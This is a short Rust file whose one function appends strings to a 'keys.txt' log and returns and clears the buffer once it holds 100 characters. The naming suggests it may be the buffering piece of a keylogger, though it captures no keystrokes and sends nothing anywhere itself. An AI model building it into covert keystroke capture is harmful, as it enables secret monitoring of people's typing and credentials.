use std::fs::{OpenOptions, read_to_string, write};
use std::io::Write;

const LOG_FILE: &str = "keys.txt";
const MAX_CHARS: usize = 100;

pub fn append_key(key: &str) -> Option<String> {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(LOG_FILE)
        .unwrap();
    writeln!(file, "{}", key).unwrap();
    drop(file);

    let content = read_to_string(LOG_FILE).unwrap_or_default();
    if content.len() >= MAX_CHARS {
        write(LOG_FILE, "").unwrap();
        return Some(content);
    }
    None
}
